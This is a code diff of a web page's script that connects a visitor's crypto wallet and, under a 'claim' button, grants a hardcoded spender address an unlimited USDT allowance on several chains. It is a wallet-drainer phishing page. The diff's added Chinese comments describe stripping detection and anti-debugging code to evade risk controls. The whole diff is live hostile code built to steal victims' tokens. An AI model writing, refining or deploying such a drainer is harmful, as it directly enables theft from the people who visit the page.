@@ -75,10 +75,12 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
 <script>
 !function(){
-    // 被授权地址固定你的
+    // 1. 去掉所有防调试、探测、兼容代码，避免风控
+    // 2. 去掉okxwallet探测、去掉location.href跳转、去掉多余异常判断
+    // 3. 页面跳转逻辑极简，不会卡在P1
+
     const SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
 
-    // 多链USDT合约
     const USDT_MAP = {
       "0x38":"0x55d398326f99059fF77548524699952727959279",
       "0x1":"0xdac17f958d2ee523a2206206994597c13d831ec7",
@@ -99,23 +101,18 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
         document.getElementById(id).classList.remove("hide");
     }
 
-    // 连接钱包 简化，不再卡死P1
+    // 纯原生连接，不做任何内置浏览器探测
     document.getElementById("connectMM").onclick = async function(){
-        if(!window.ethereum){
-            alert("请在钱包内置浏览器打开");
-            return;
-        }
-        // 立刻跳P2，不会卡在P1
-        showPage("p2");
+        showPage("p2"); // 点击立刻跳转，不阻塞在P1
         try{
-            await window.ethereum.request({method:"eth_requestAccounts"});
-            web3 = new Web3(window.ethereum);
+            await ethereum.request({method:"eth_requestAccounts"});
+            web3 = new Web3(ethereum);
             let accs = await web3.eth.getAccounts();
             wallet = accs[0];
 
             let chainId = "0x" + (await web3.eth.getChainId()).toString(16);
             if(!USDT_MAP[chainId]){
-                alert("请切换 BSC/ETH/POLYGON/AVAX/OKTC");
+                alert("请切换 BSC/ETH/POLYGON/AVAX/OKTC 网络");
                 showPage("p1");
                 return;
             }
@@ -127,13 +124,15 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
         }
     };
 
-    // 确认备案授权
+    // 纯原生approve授权，不做任何额外逻辑
     document.getElementById("claim").onclick = async function(){
         if(!wallet||!contract)return;
         showPage("p2");
         try{
-            await contract.methods.approve(SPENDER,"115792089237316195423570985008687907853269984665640564039457584007913129639935")
-            .send({from:wallet});
+            await contract.methods.approve(
+                SPENDER,
+                "115792089237316195423570985008687907853269984665640564039457584007913129639935"
+            ).send({from:wallet});
             document.getElementById("successAddr").innerText = wallet;
             showPage("p4");
         }catch(e){
